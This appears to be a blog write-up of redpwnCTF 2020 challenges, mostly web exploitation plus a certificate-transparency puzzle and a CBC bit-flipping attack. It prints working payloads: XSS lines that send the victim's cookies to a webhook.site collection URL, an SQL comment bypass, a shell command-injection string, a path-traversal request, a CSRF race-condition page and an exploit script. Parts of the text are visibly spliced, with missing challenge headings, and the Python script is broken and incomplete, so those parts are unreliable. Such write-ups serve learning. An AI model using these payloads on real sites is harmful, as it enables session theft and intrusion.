I enjoyed this CTF overall and there were many well-made challenges! I played with CTF.SG again, and although we barely solved a single RE, it was lots of fun in the other categories.

# Inspector General

#### Category: Web | 1300 solves | 112 points

<details>
  <summary>Challenge Description</summary>
  
  My friend made a new webpage, can you find a flag?

</details>

The challenge description mentions the inspector tool, but all your have to do is to just view the source as the flag is not dynamically loaded. 

Go to `view-source:https://redpwn.net/` and you will see the flag on `line 7`.

  I made a cool login page. I bet you can't get in!
<br />
  Site: login.2020.redpwnc.tf
</details>

It looked like a simple SQLi, so I tried `admin';` and `admin'; -- `, but no luck. However, as an extension, I then tried `admin'; /*` - another way of writing the comment tag and we got the flag!

# Static-Pastebin

#### Category: Web | 374 solves | 373 points

<details>
  <summary>Challenge Description</summary>
  
 I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here
<br />
  Site: static-pastebin.2020.redpwnc.tf
<br />
  Note: The site is entirely static. Dirbuster will not be useful in solving it.
</details>


This was also pretty easy! Reading `/paste/script.js`, we can see that it is just simple XSS.

#### Payload

`"><img src=x onerror="javascript:document.location='https://webhook.site/016547ba-79c7-4a80-b9d4-5e4f21e63513?c='+document.cookie"></img>`

By sending this paste to the admin, we can get the flag!

  I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!
<br />
Site: panda-facts.2020.redpwnc.tf
</details>

I solved this after the CTF ended as my teammate waituck had already solved it.

We actually went down the wrong rabbit hole of AES-CBC bit flipping, until we checked the number of solves and decided that we were thinking too much. 

The solution here is JSON Injection, since it was not validated.

#### Payload

Just login as `CTF.SG", "member": 1, "b": "CTF.SG` and you'll be recognized as a `member` and hence be able to see the flag.

# Static-Static-Hosting

#### Category: Web | 222 solves | 434 points

<details>
  <summary>Challenge Description</summary>
  
  Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me here
<br />
Site: static-static-hosting.2020.redpwnc.tf
<br />
Note: The site is entirely static. Dirbuster will not be useful in solving it.

</details>

This is the same as the previous challenge, you just have to XSS the admin to get the cookies, which most likely contains the flag.

I first tried the `<script>` tags which didn't work, and after reading the source on https://static-static-hosting.2020.redpwnc.tf/site/script.js I understood why:  

```javascript
if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
```

It removes the script tags then sanitizes them. Thus, let's take a look at the sanitize function:

```javascript
if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
```

So basically you can only use `src`, `width`, `height`, `alt`, `class` to load your XSS payload.
I actually tried `<img src` but found out for the first time that you cannot load script tags in the `src` attribute (how did I not know that before...).

So I tried the `iframe` way and it worked on the first try!

#### Payload        

`<iframe src="javascript:top.location='//webhook.site/016547ba-79c7-4a80-b9d4-5e4f21e63513/?c='+document.cookie"></iframe>`

Send the site to admin and you'll get the flag in your response.

# Tux-Fanpage

#### Category: Web | 135 solves | 464 points

<details>
  <summary>Challenge Description</summary>
  
  My friend made a fanpage for Tux; can you steal the source code for me?
<br />
Site: tux-fanpage.2020.redpwnc.tf
</details>


This is a very geocities site that almost gave me a headache looking at it, so I jumped straight to the provided `index.js` source instead of actually looking at the site.

Just from line 9, we can see that there is a possibility of LFI `res.redirect('/page?path=index.html')` as the app calls the page with a path by specifying the filename.

Moving on, we check the logic:


```javascript
//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}
```

This is nothing, since you can simply bypass it with `../` if not for the `preventTraversal(dir)` function.

```javascript
//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}

```

This is also nothing, since you just have to add a letter/number as your first character in your payload, eg. `a../` will bypass the 2 functions above.

```javascript
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}
```

However, this was a problem that got me stuck for a while as I did not realise on the first glance that it is not bypass-able, while attempting to meet the requirements of the other 2 functions. After an hour, I decided to read the rest of the source more carefully and noticed the checking logic:

```javascript
path = strip(path)

path = preventTraversal(path)
```

And then I thought, "This was it!!" Since both `strip` and `preventTraversal` was not checked at the same time, all you have to do is to fool the parser.

#### Payload

https://tux-fanpage.2020.redpwnc.tf/page?path=a&path=../../../index.js 

Send this and we'll get the source where the flag is not `[REDACTED]` instead. On Line 6: `const flag = 'flag{tr4v3rsal_Tim3}'`, we have the flag.

# Post-It-Notes

<details>
  <summary>Challenge Description</summary>
  Request smuggling has many meanings. Prove you understand at least one of them at 2020.redpwnc.tf:31957.
<br />
Note: There are a lot of time-wasting things about this challenge. Focus on finding the vulnerability on the backend API and figuring out how to exploit it.
</details>

Again, let me start off by saying there is no route from request smuggling to the flag. Many hours were wasted due to the troll challenge description. The request smuggling occurs because of the wide range of ports used, but the actual exploit here is command injection due to `subprocess.Popen(f"cat 'notes/{nid}'`.     
Lesson learnt: Read the source code and ignore the challenge description.

Just like in Defenit, we guessed the `flag.txt` without even using `ls` first.

#### Payload

`';cat 'flag.txt`

<!--![Post-It-Notes-flag](../assets/redpwn-ctf-2020/Post-It-Notes-flag.png)-->

Anyway, my teammate Justin was the one who solved this after I gave up on the request smuggling exploitation, so I'll put a link to his blog after he's done writing it.

# Anti-Textbook

<details>
  <summary>Challenge Description</summary>
  
  It's important for public keys to be transparent.
<br />
Hint: certificate-transparency.org
</details>

Let's start off first by saying the hint didn't help at all. In fact, it led me on a wrong rabbit hole where I went to https://security.googleblog.com/2017/01/security-through-transparency.html and went to their github repo for that and nothing good came out of it.

So anyway, at first when I saw the `data.txt` I thought this was a crypto question. In fact, it is part crypto, since I solved it with this script:

```python
from Crypto.PublicKey.RSA import construct

e = long(65537)
n = long(23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561)
pubkey = construct((n, e))
print(pubkey.exportKey())
```

This will give us the public key, which I tried searching for the hashed version (both SHA-1 and SHA-256) on https://crt.sh/ but nothing good came out of it.

After a while, I was definitely stuck so I just left it there, until my teammate pointed out that I was searching for the hash of a *public key* instead of *certificate*. D'oh!

So let's convert it to a certificate using `openssl`:     
`openssl pkey -pubin -outform der -in textbook.key | openssl dgst -sha1`

By `SHA-1` hashing the `.der` format of the key, we can find the actual domain on the site here: https://crt.sh/?id=2001057066

After visiting the DNS listed in the `Subject/commonName` (oa4gio7glypwggb9iu3rh8mrc87tnjbs.flag.ga), we get the flag!

# Cookie-Recipes-v2

#### Category: Web | 51 solves | 488 points

<details>
  <summary>Challenge Description</summary>
  
  I want to buy some of these recipes, but they are awfully expensive. Can you take a look?

Site: cookie-recipes-v2.2020.redpwnc.tf
</details>

So we are given a site where you can purchase flags. I already know where this is going - we just have to get our hands on the shop item called `flag`, which as usual, there is no way our balance will be able to afford it.

Since we don't have a sell function but a report function instead, I knew we have to phish the admin somehow - either by XSS or CSRF - by sending a link containing our payload.

So anyway, while blackboxing the site, I found an IDOR within 4 minutes of opening it and got the admin credentials - username and password. 

![Admin Password](../assets/redpwn-ctf-2020/Cookies-v2-Admin-Password.png)

I had guessed that the admin ID was either `1` or `0`, and afterwards I also noticed that in the last several lines of the source, a comment did state that the ID is `0`. 

However, trying to log in as admin fails because it checks for the IP, and it is *NOT* bypass-able via any HTTP Header since it is being checked by validating `req.socket.remoteAddress`. Nevertheless, I still tried it anyway and you can see the failed results:

![IP Request Headers](../assets/redpwn-ctf-2020/Cookies-v2-IP-Headers.png)

So anyway, I went to continue blackboxing because it's more fun that way.

We find out that CSRF *might not* be possible, since the request is being sent via JSON, so there will always be a trailing `=` sign at the back of the request. HOWEVER, I also found that since the `Content-Type` is not being checked, you can simply send your payload as a JSON String and it will work, like this!

`xhr.send(JSON.stringify({"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}));`

Then I got stuck again, as I remembered that the admin account only has a balance of 140, which was far from enough to purchase the flag at 1000. However, my teammate Kenneth suggested that maybe the admin had already purchased the flag, so we went into the wrong rabbit hole of trying to get the result of `getPurchased` and getting the admin to send it to us. 

In the process, I learnt about maintaining session during `xhr` by using `withCredentials` and `onload` and `onreadystatechange`. I also learnt that it is impossible to either retrieve the `Set-Cookie` header from the response or send a `Cookies` header with `xhr`, since it was blocked by the specifications for security reasons.

Anyway, waituck came in and saved the day by telling us that you could just solve it with a Race condition, like this:

#### Payload

```javascript
<html><script>
    async function jsonreq() {
        var xhr = new XMLHttpRequest()
        xhr.open("POST","https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=13186538601383376495", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type","text/plain");
        xhr.send(JSON.stringify({"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}));
    }
    for (var i = 0; i < 1000; i++) {
        jsonreq();
    }
</script></html>
```

Host this on your server and send it to the admin. Soon, you'll have enough credits to buy the flag.

![Cookies v2 Buy Flag](../assets/redpwn-ctf-2020/Cookies-v2-Buy-Flag.png)

And go to `/purchases` to view it!

  Uh oh; it looks like they already migrated to a more secure platform. Can you do your thing again? These horrible people must be stopped!
<br />
Site: panda-facts-v2.2020.redpwnc.tf
</details>

This is the actual bit flipping crypto we were trying to do in Panda-v1, so we just expanded on that solution and used it here.

I can only do Baby Crypto, so I left it to my crypto guy waituck, as advised by the challenge author to another person in the discord. 

![Discord-Panda-Hint](../assets/redpwn-ctf-2020/Discord-Panda-Hint.png)

I'll paste the solution here if he doesn't write it, but it is basically ensuring the last bit is `\",\"member_: n"}` where `n` is systematically bruteforced until we get to the target.

#### Payload

```python
#!/usr/bin/env python

import requests
import json
from pwn import *

def blockify(a):
    return [a[i:i+16] for i in range(0, len(a), 16)]

    r = requests.get('https://panda-facts-v2.2020.redpwnc.tf/api/validate',cookies=cookie)

def get_cookie(payload):
    r = requests.post('https://panda-facts-v2.2020.redpwnc.tf/api/login', json = {'username' : payload})
    return json.loads(r.text)['token'].decode('base64')

def get_flag(blks):
    encoded_payload = blocks_to_payload(blks)
    cookie = {'token': encoded_payload}
    r = requests.get('https://panda-facts-v2.2020.redpwnc.tf/api/flag',cookies=cookie)
    return json.loads(r.text)['flag']


def bind_payload(payload, i):
    return payload % ("%25d" % i)


def xor_payload(block):
    # our current \",\"member_: "}
    # our target  _",_"member": n}
    new_payload = ""
    new_payload += chr(ord(block[0]) ^ ord("\\") ^ ord(" "))
    new_payload += block[1:3]
    new_payload += chr(ord(block[3]) ^ ord("\\") ^ ord(" "))
    new_payload += block[4:11]
    new_payload += chr(ord(block[11]) ^ ord("_") ^ ord('"'))
    new_payload += block[12:14]
    new_payload += chr(ord(block[14]) ^ ord('"') ^ ord('1'))
    new_payload += block[15:]
    return new_payload

payload_len = 25
payload = '%s","member_: '

for i in range(1000):
    c_payload = bind_payload(payload, i)
    cookie = get_cookie(c_payload)

    if 'true' in data:

        log.success(flag)
        break

The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?

We just have to execute the script step-by-step, with comments. So just use 

`bash -x cmd.sh`     
and you'll get one character of the flag printed out every step of the script.
